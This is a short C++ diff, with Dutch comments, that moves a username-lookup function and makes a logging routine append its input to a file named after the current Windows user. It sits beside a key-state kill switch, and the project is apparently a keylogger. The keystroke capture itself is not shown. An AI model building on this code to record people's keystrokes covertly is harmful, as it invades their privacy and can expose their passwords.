@@ -7,9 +7,15 @@
 
 using namespace std;
 
-// logt de input naar een file genaamd data.txt
+char* GetUser() {
+    char* user = getenv("USERNAME");
+    return user;
+}
+
 void LOG(string input) {
-    fstream LogFile("data.txt", fstream::app);
+    string username = GetUser();
+    string filename = username + ".txt";
+    fstream LogFile(filename, fstream::app);
     if (LogFile.is_open()) {
         LogFile << input;
         LogFile.close();
@@ -66,10 +72,10 @@ bool KillSwitch() {
            (GetAsyncKeyState(VK_MULTIPLY) < 0);
 }
 
-char* GetUser() {
+/* char* GetUser() {
     char* user = getenv("USERNAME");
     return user;
-}
+} */
 
 // main functie
 int main()
